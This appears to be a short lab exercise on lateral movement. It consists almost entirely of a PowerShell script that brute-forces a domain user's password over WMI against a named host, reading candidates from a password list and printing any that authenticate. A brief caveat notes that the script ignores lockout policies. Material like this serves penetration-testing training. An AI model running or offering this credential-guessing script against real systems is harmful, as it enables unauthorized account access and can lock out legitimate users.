## Hands On 6
### Lateral Movement
#### Use WMI to brute force password for a given user in the domain
Note: This solution does not account for password policies.  It has the potential to lock a user's account

```
$password_list = Get-Content "C:\Users\admin\Documents\password_list.txt"
$user = "home.local\user3"
foreach ($password in $password_list) {

  $secure_string = ConvertTo-SecureString -string $password -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -Argument $user,$secure_string

  try{
    Get-WmiObject -class win32_computerSystem -Computer Win7x64 -Credential $Credential
    Write-output "$user : $password"
  } catch { continue }
}
```
